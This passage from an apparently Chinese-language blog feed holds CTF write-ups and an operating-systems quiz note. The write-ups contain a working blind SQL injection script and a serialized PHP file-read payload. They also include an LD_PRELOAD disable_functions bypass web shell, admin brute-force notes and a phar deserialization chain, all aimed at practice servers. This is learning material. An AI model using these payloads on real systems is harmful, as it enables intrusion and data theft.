invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file=TzozOiJBUFQiOjI6e3M6NDoiZXRoMCI7Tzo0OiJLMVQwIjoyOntzOjc6IgAqAGZpbGUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vZmxhZyI7czo0OiJ0ZXN0IjtOO31zOjQ6ImV0aDEiO047fQ</span><br></pre></td></tr></table></figure><p>你可能会读取 flag.php 但是是在&#x2F;flag (贾学长的想法—–)</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>题目不算很难，基本上路径上的路都给你铺好了。但是这确实一条很常见的渗透思路的路径,或许你之后的渗透中也能用上这种方式找到后台。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统概念集合</title>
      <link href="/2024/12/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E9%9B%86%E5%90%88/"/>
      <url>/2024/12/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>1.不同的进程必然对应不同的程序。 </p><ol><li>错误。进程是程序的一次执行，不同的进程可以包含同一个程序，同一个程序在<br> 执行中也可以产生多个进程。</li></ol><p>2.并发是并行的不同表述，其原理相同。</p><ol start="2"><li>错误。并发是指多道程序的执行在一个时间段中是重叠的，一个程序的执行尚未结束，另一个程序的执行已经开始。但对单CPU而言，每一时刻只能有一个程序在运行(与此同时当然可以有其他程序有的正在输入、有的正在输出)，即占有CPU的只有一个程序，这就是并发“在宏观上并行执行，在微观上交替执行”的含义。而并行是真正的同时执行，因此两者的含义是不同的。</li></ol><p>3.程序在运行时需要很多系统资源，如内存、文件、设备等，因此操作系统以程序为单位分配系统资源。   </p><ol start="3"><li>进程为单位</li></ol><p>4.进程在运行中可以自行修改自己的进程控制权。</p><ol start="4"><li>pcb 不能自己修改</li></ol><p>5.程序的并发执行是指同一时刻有两个以上的程序，它们的指令在同一 CPU 上执行。</p><ol start="5"><li>宏观上并行 ，微观上串行</li></ol><p>6.进程控制块(PCB)是用户进程的私有数据结构，每个进程仅有一个PCB。</p><ol start="6"><li>内核进程 和用户进程</li></ol><p>7.当一个进程从阻塞态变为就绪态时，一定有一个进程从就绪态变为运行态。</p><p>仅在抢占式调度方式下，且由阻塞态变为就绪态的进程具有最高优先级(比就绪队列中所有进程和当前运行进程的优先级都高)时，才立即被进程调度程序选中投入运行，即由就绪态变为运行态。</p><p>8.进程状态的转换是由操作系统完成的，对用户是透明的。</p><p>9.进程从运行态变为阻塞态是由于时间片中断发生。</p><p>10.当条件满足时，进程可以由阻塞态直接转换为运行态。</p><p>11.当条件满足时，进程可以由就绪态转换为阻塞态。</p><p>12.进程自身可以决定从运行态转换为阻塞态。</p><p>  进程从运行态到就绪态或从就绪态到运行态都是由进程调度程序决定的，从阻塞态到就绪态则取决于该进程所等待的外部事件是否完成。而从运行态到阻塞态是由运行进程自身决定的，即运行进程因某个等待事件发生而将自己阻塞</p><p>13.在抢占式进程调度下，现运行进程的优先级不低于系统中所有进程的优先级，</p><p>  优先级是进程调度的重要依据，一旦确定就不能改变。<br>  但是运行的优先级一定高于就绪的优先级但是.不一定高于 阻塞状态的优先级.</p><p>14.先来先服务调度算法对短(作业)进程有利.   </p><p>16.在任何情况下采用短作业优先调度算法都能够使作业的平均周转时间最小。</p><p>17.时间片的大小对轮转法的性能有很大影响，时间片太短会导致系统开销增加。</p><p>18.在分时系统中,进程调度以优先级调度算法为主.以短进程优先调度算法为辅。<br><br>时间片轮转算法<br>19.在单CPU上的进程就绪队列和进程阻塞队列都只能有一个。</p><p>20.某进程被唤醒后立即投入运行，因此系统采用的一定是抢占式进程调度。</p><p>1.采用多道程序设计的系统中，系统中的程序道数越多，系统的效率越高。<br>2.应用软件是加在裸机上的第一层软件。<br>3.操作系统特征之一的“不确定性”是指程序运行的结果是不确定的。</p><pre><code>执行顺序和运行时间的不确定性</code></pre><p>4.多道程序设计可以缩短系统中程序的执行时间。</p><pre><code>只有操作系统的部分内核程序才需要常驻内存。</code></pre><p>5.操作系统的所有程序都必须常驻内存。</p><pre><code>只有操作系统的部分内核程序才需要常驻内存。</code></pre><p>6.分层式结构的操作系统必须建立模块之间的通信机制，所以系统效率高。</p><pre><code>分层式操作系统必须简历模块之间的通信 效率低 </code></pre><p>7.微内核结构操作系统具有较高的灵活性和扩展性。</p><p>8.操作系统内核不能使用特权指令。  </p><p>9.通常将CPU模式分为内核态(核心态)和用户态，这样做的目的是为了提高运行速度。<br>10.从响应的角度看，分时系统与实时系统的要求相似。</p><p>11.使计算机系统能够被方便地使用和高效地工作是操作系统的两个主要设计目标。</p><p>12.操作系统的存储管理就是指对磁盘存储器的管理。</p><p>13.分时操作系统允许两个以上的用户共享一个计算机系统。</p><p>14.实时操作系统只能用于控制系统而不能用于信息管理系统。</p><p>15.当CPU处于用户态时，它可以执行所有的指令。</p><p>16.访管指令为非特权指令，在用户态下执行时会将 CPU转换为内核态。</p><p>17.系统调用与程序级的子程序调用是一致的。<br>18.用户程序有时也可以在内核态下运行。<br>19.执行系统调用时会产生中断。<br>20.系统调用返回时，由内核态变为用户态执行用户程序。<br>21.中断的处理是由硬件和软件协同完成的，各中断处理程序是操作系统的重要组成部分，所以对中断的处理是在内核态下进行的。                                                                                                                                                            </p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn训练</title>
      <link href="/2024/12/19/ciscn%E8%AE%AD%E7%BB%83/"/>
      <url>/2024/12/19/ciscn%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<h5 id="modbus"><a href="#modbus" class="headerlink" title="modbus"></a>modbus</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>():</span><br><span class="line">     captures = pyshark.FileCapture(<span class="string">&quot;question_1564353677_modbus1.pcap&quot;</span>)</span><br><span class="line">     func_codes = &#123;&#125;</span><br><span class="line">     <span class="keyword">for</span> c <span class="keyword">in</span> captures:</span><br><span class="line">         <span class="keyword">for</span> pkt <span class="keyword">in</span> c:</span><br><span class="line">             <span class="keyword">if</span> pkt.layer_name == <span class="string">&quot;modbus&quot;</span>:</span><br><span class="line">                 func_code = <span class="built_in">int</span>(pkt.func_code)</span><br><span class="line">                 <span class="keyword">if</span> func_code <span class="keyword">in</span> func_codes:</span><br><span class="line">                     func_codes[func_code] += <span class="number">1</span></span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     func_codes[func_code] = <span class="number">1</span></span><br><span class="line">     <span class="built_in">print</span>(func_codes)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> get_code()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要是为了得到挑战码</span></span><br><span class="line"><span class="comment"># 这就是 这个协议的作用地方利用脚本分析 挑战码然后去找异常</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241210170511.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241210170533.png" alt="image.png"></p><h5 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔盲注 但是注入点不允许and or 逻辑 只能是一个一个去试 注入到数字里面</span></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28456/index.php&#x27;</span>  </span><br><span class="line">database = <span class="string">&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">payload1 = <span class="string">&quot;?stunum=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>  <span class="comment"># 库名为ctf  </span></span><br><span class="line">payload2 = <span class="string">&quot;?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>  <span class="comment"># 表名为flag,score  </span></span><br><span class="line">payload3 = <span class="string">&quot;?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>  <span class="comment"># 列名为flag,value  </span></span><br><span class="line">payload4 = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span>  <span class="comment">#  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):  </span><br><span class="line">    low = <span class="number">32</span>  </span><br><span class="line">    high = <span class="number">128</span>  </span><br><span class="line">    mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):  </span><br><span class="line">        DATA = &#123;<span class="string">&quot;id&quot;</span>:payload4.<span class="built_in">format</span>(i,mid)&#125;  </span><br><span class="line">        <span class="comment"># payload = payload1.format(i,mid)    #查库名  </span></span><br><span class="line">        <span class="comment">#payload = payload2.format(i,mid)  #查表名  </span></span><br><span class="line">        <span class="comment"># payload = payload3.format(i,mid)  #查列名  </span></span><br><span class="line">        <span class="comment">#payload = payload4.format(i, mid)  # 查flag  </span></span><br><span class="line">        new_url = url  </span><br><span class="line">        r = requests.post(new_url,data=DATA)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            low = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            high = mid  </span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    database += <span class="built_in">chr</span>(mid)  </span><br><span class="line">    <span class="comment"># 这个是防止我的 for 循环太大了  </span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+database)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="NSSCTF-3rd-NSS影院"><a href="#NSSCTF-3rd-NSS影院" class="headerlink" title="[NSSCTF 3rd]NSS影院"></a>[NSSCTF 3rd]NSS影院</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241213101721.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[10:21:20] Starting:                                                                                                                         </span><br><span class="line">[10:21:20] 301 -  185B  - /js  -&gt;  http://node7.anna.nssctf.cn/js/          </span><br><span class="line">[10:21:39] 200 -    0B  - /.htaccess                                        </span><br><span class="line">[10:23:23] 301 -  185B  - /article  -&gt;  http://node7.anna.nssctf.cn/article/</span><br><span class="line">[10:23:23] 200 -    1KB - /article/                                         </span><br><span class="line">[10:23:48] 301 -  185B  - /comment  -&gt;  http://node7.anna.nssctf.cn/comment/</span><br><span class="line">[10:24:01] 301 -  185B  - /data  -&gt;  http://node7.anna.nssctf.cn/data/      </span><br><span class="line">[10:24:07] 301 -  185B  - /detail  -&gt;  http://node7.anna.nssctf.cn/detail/  </span><br><span class="line">[10:24:16] 200 -    1KB - /err.php                                          </span><br><span class="line">[10:24:23] 200 -   15KB - /favicon.ico                                      </span><br><span class="line">[10:24:39] 200 -    1KB - /i.php                                            </span><br><span class="line">[10:24:42] 301 -  185B  - /include  -&gt;  http://node7.anna.nssctf.cn/include/</span><br><span class="line">[10:24:46] 301 -  185B  - /install  -&gt;  http://node7.anna.nssctf.cn/install/</span><br><span class="line">[10:24:58] 301 -  185B  - /list  -&gt;  http://node7.anna.nssctf.cn/list/      </span><br><span class="line">[10:25:01] 200 -    1KB - /login.php                                        </span><br><span class="line">[10:25:10] 200 -    3KB - /member.php                                       </span><br><span class="line">[10:25:22] 301 -  185B  - /news  -&gt;  http://node7.anna.nssctf.cn/news/      </span><br><span class="line">[10:26:01] 200 -    1KB - /s.php                                            </span><br><span class="line">[10:26:04] 200 -    1KB - /search.php                                       </span><br><span class="line">[10:26:31] 301 -  185B  - /templets  -&gt;  http://node7.anna.nssctf.cn/templets/</span><br><span class="line">[10:26:36] 301 -  185B  - /topic  -&gt;  http://node7.anna.nssctf.cn/topic/    </span><br><span class="line">[10:26:39] 301 -  185B  - /upload  -&gt;  http://node7.anna.nssctf.cn/upload/  </span><br><span class="line">[10:26:40] 301 -  185B  - /uploads  -&gt;  http://node7.anna.nssctf.cn/uploads/</span><br><span class="line">[10:26:46] 301 -  185B  - /video  -&gt;  http://node7.anna.nssctf.cn/video/    </span><br><span class="line">[10:27:03] 200 -   42KB - /www.zip                                                                            </span><br></pre></td></tr></table></figure><p><a href="http://www.zip/">www.zip</a> 发现是一个密码字典   一看就是需要爆破 </p><p>data目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     </span><br><span class="line">[10:50:24] 301 -  185B  - /data/admin  -&gt;  http://node7.anna.nssctf.cn/data/admin/</span><br><span class="line">[10:51:30] 301 -  185B  - /data/cache  -&gt;  http://node7.anna.nssctf.cn/data/cache/      </span><br><span class="line">[10:55:33] 301 -  185B  - /data/sessions  -&gt;  http://node7.anna.nssctf.cn/data/sessions/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241213111115.png" alt="image.png"></p><p>后来发现 在这里面有提示 是后台</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241213111204.png" alt="image.png"><br>进入是海洋cms </p><ol><li>验证码 跟phpsessid 绑定 。一个phpsessid 可以多次放包利用同一个验证码 进行爆破</li><li>弱验证码 可以识别 爆破</li></ol><p>刚才给了字典，利用字典这两种爆破都可以 。但是目前有个问题就是我们不知道用户  搜集了一下发帖子的 用户看到了一个 d3f4u1t  </p><p>再拿到字典爆破成功登陆 看到flag</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241213145857.png" alt="image.png"></p><h5 id="CISCN-2023-西南-do-you-like-rea"><a href="#CISCN-2023-西南-do-you-like-rea" class="headerlink" title="[CISCN 2023 西南]do_you_like_rea"></a>[CISCN 2023 西南]do_you_like_rea</h5><p>后台登陆   admin&#x2F;admin123<br>登陆后有一个上传点 ，可以上传一些文件 </p><p>后来才发现我们有一个附件 ，里面有数据库配置信息 这个给不给都可以。太扯淡了，admin123 我自己就能试出来</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241213201826.png" alt="image.png"></p><p>上传点同样扯淡，这还需要代码审计 ，不是白名单，后缀随便传递  env</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241213203208.png" alt="image.png"></p><p>看了wp </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="comment">// 关键问题就在这里 ，这是一个很大的危险 </span></span><br><span class="line">    <span class="comment">/*LD_PRELOAD 是一个环境变量，允许攻击者在运行程序时强制加载特定的共享库。如果攻击者能够设置 LD_PRELOAD 为 bypass_disablefunc_x64.so，该库将在所有的程序启动时被加载。</span></span><br><span class="line"><span class="comment">这个恶意库可能会覆盖一些标准的库函数，例如 system()、exec()，或者甚至 mail()，从而允许攻击者执行任意命令*/</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//nl2br 是讲\n 转化成 html 的&lt;br&gt;  转化成html 输出 </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[09:53:50] 200 -    1KB - /login.php                                        </span><br><span class="line">[09:53:57] 200 -    1KB - /register.php                                     </span><br><span class="line">[09:54:01] 301 -  185B  - /static  -&gt;  http://node4.anna.nssctf.cn/static/  </span><br><span class="line">[09:54:04] 301 -  185B  - /uploads  -&gt;  http://node4.anna.nssctf.cn/uploads/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫了半天发现一无所获。之后上传点传了一个jpg发现可以下载，下载可以下载绝对路径 直接下载任意文件</p><p>审计 download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//初始化 配置 一般来讲 这个是设置安全目录   getcwd是设置 当前目录  </span></span><br><span class="line"><span class="comment">// open_basedir 不会限制基于绝对路径的文件访问，但它会限制基于相对路径的文件访问。</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="comment">// 改变目录为 s盒目录 </span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="comment">// strister  stristr()是一个 PHP 函数，它对字符串中的子字符串执行不区分大小写的搜索。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="comment">// basename 返回 文件名字 (最后的 )</span></span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有任意文件下载主要是因为 open_basedir 因为他限制了。 当前脚本只有访问&#x2F;var&#x2F;www&#x2F;html  和 &#x2F;etc   &#x2F;tmp 的权限只能下载子目录</p><h5 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h5><ol><li>有文件上传点</li><li>有伪协议触发点</li><li>有危险序列化 操作</li></ol><p>首先看一下 链子<br>&#x2F;&#x2F; 链子 User()-&gt;Filelist()-&gt;close方法-&gt;call()方法-&gt;File()-&gt;close()方法执行-&gt;Filelist 析构方法执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FILE类 有危险操作 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>可以看到User 有一个  close 的方法调用但是close是关闭 数据库连接的 。但是$this-&gt;db可控可以换成<br>File的对象 但是我们发现我们并没有输出。我们无法返回到前端。也就是我们读了文件但是无法输出 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Filelist有一个__call函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>$func 是close 方法  $file 可以换成File对象。 然后可以利用   $file的close方法。然后保存到  $this-&gt;result方法中。  此时恰好__destruct 有可以回显我们result的功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span 